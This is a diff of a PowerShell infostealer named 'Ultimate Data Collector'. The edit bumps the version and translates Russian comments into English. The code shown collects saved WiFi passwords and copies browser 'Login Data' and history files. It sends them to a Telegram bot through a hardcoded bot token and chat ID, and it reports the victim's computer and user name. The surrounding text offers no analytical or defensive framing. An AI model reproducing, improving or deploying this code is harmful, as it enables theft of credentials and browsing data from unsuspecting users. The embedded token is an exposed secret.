@@ -1,11 +1,11 @@
 <#
 .SYNOPSIS
-    Ultimate Data Collector v4.1
+    Ultimate Data Collector v4.2
 .DESCRIPTION
-    Собирает WiFi пароли, логины из браузеров и историю посещений
+    Collects WiFi passwords and browser data
 #>
 
-# Конфигурация Telegram
+# Telegram configuration
 $BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
 $CHAT_ID = "6525689863"
 $TEMP_DIR = "$env:TEMP\DC_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
@@ -54,7 +54,7 @@ function Send-FileToTelegram {
     }
 }
 
-# Сбор WiFi паролей (исправленная версия)
+# WiFi passwords collection
 function Get-WiFiPasswords {
     $outputFile = "$TEMP_DIR\wifi_passwords.txt"
     $result = @("=== WiFi Passwords ===")
@@ -87,7 +87,7 @@ function Get-WiFiPasswords {
     return $outputFile
 }
 
-# Сбор данных браузеров
+# Browser data collection
 function Get-BrowserData {
     $outputFile = "$TEMP_DIR\browser_data.txt"
     $result = @("=== Browser Data ===")
@@ -103,14 +103,12 @@ function Get-BrowserData {
                 $browserDir = "$TEMP_DIR\$($browser.Name)_Data"
                 New-Item -Path $browserDir -ItemType Directory -Force | Out-Null
                 
-                # Копируем файлы с логинами
                 $loginFile = Join-Path $browser.Path "Login Data"
                 if (Test-Path $loginFile) {
                     Copy-Item $loginFile "$browserDir\LoginData" -Force
                     $result += "$($browser.Name): Login Data copied"
                 }
                 
-                # Копируем историю
                 $historyFile = Join-Path $browser.Path "History"
                 if (Test-Path $historyFile) {
                     Copy-Item $historyFile "$browserDir\History" -Force
@@ -126,7 +124,7 @@ function Get-BrowserData {
     return $outputFile
 }
 
-# Основной сбор
+# Main collection
 try {
     Send-ToTelegram -Text "Data collection started on $env:COMPUTERNAME ($env:USERNAME)"
     
